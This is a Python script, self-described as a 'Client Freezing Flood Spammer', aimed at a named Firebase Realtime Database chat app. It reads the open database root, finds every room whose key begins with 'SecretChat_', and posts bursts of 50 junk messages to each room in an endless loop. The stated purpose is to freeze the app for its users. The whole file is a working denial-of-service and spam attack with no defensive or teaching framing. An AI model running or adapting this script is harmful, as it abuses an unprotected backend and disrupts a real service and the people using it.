import time
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Client Freezing Flood Spammer Initialized...")

session = requests.Session()

while True:
    try:
        # Step 1: Scan all active server rooms
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                for key in data.keys():
                    if key.startswith("SecretChat_"):
                        room_url = f"{database_url}/{key}.json"
                        
                        # Step 2: Fire a burst of junk packets to overwhelm the client UI loop
                        for i in range(50):
                            junk_payload = {
                                "Sender": "LAG_SYSTEM_NULL_" + str(i),
                                "Message": "SYSTEM OVERLOAD FREEZE FLODDING " * 20,
                                "Timestamp": int(time.time() * 1000) + i,
                                "Aura": "voidWings",
                                "Color": "red"
                            }
                            # Send asynchronously or rapid-fire
                            session.post(room_url, json=junk_payload, headers=headers, timeout=1)
                            
                        print(f"[FORBID] Burst flood delivered to room: {key}")
        else:
            print(f"[FORBID] Root scan failed: {root_response.status_code}")
            
    except Exception as e:
        print(f"[FORBID] Flood error: {e}")
        
    # Minimal delay to keep the pressure constant without dropping connections
    time.sleep(0.1)
